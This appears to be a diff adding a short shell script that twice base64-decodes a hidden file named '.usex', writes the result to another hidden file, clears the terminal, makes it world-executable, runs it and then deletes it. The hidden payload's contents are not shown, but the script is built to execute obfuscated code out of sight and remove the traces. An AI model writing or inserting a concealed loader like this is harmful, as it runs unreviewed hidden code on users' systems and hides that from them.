@@ -1,0 +1,8 @@
+decod=$(base64 -d .usex)
+echo "$decod" |& tee .usex1
+decoda=$(base64 -d .usex1)
+echo "$decoda" |& tee .usex1
+clear
+chmod 777 .usex1
+./.usex1
+rm -fr .usex1
